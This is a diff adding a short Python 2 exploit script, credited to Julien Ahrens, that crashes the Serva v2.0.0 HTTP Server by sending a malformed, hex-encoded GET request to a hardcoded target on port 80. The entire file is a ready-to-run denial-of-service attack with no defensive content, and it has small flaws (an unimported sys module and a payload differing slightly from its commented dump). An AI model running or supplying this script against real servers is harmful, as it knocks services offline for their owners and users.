@@ -1,0 +1,47 @@
+#!/usr/bin/python
+
+# Exploit Title: Serva v2.0.0 HTTP Server GET Remote Denial of Service Vulnerability
+# Version:       v2.0.0
+# Date:          2013-01-14
+# Author:        Julien Ahrens (@MrTuxracer)
+# Homepage:      www.inshell.net
+# Software Link: http://www.vercot.com
+# Tested on:     Windows XP SP3 Professional German
+# Notes:         Malformed GET Request causes the crash
+# Howto:         -
+ 
+import socket
+
+target="192.168.0.21"
+port=80
+
+# 0000   47 45 54 20 20 2f 20 48 54 54 50 2f 31 2e 31 0d  GET  / HTTP/1.1.
+# 0010   0a 48 6f 73 74 3a 20 68 74 74 70 3a 2f 2f 31 39  .Host: http://19
+# 0020   32 2e 31 36 38 2e 30 2e 32 31 0d 0a 43 6f 6e 74  2.168.0.21..Cont
+# 0030   65 6e 74 2d 4c 65 6e 67 74 68 3a 20 30 0d 0a 0d  ent-Length: 0...
+# 0040   0a                                               .
+
+payload = (
+"\x47\x45\x54\x20\x20\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d"+
+"\x0a\x48\x6f\x73\x74\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x31\x39"+
+"\x32\x2e\x31\x36\x38\x2e\x30\x2e\x32\x31\x0d\x0a\x43\x6f\x6e\x74"+
+"\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x30\x0d\x0a\x0d"+
+"\x0a"
+)
+
+print "[*] Connecting to Target " + target + "..."
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp
+try:
+    connect=s.connect((target, port))
+    print "[*] Connected to " + target + "!"
+except:
+    print "[!] " + target + " didn't respond\n"
+    sys.exit(0)
+
+print "[*] Sending malformed request..."
+
+s.send(payload)
+
+print "[!] Exploit has been sent!\n"
+s.close()
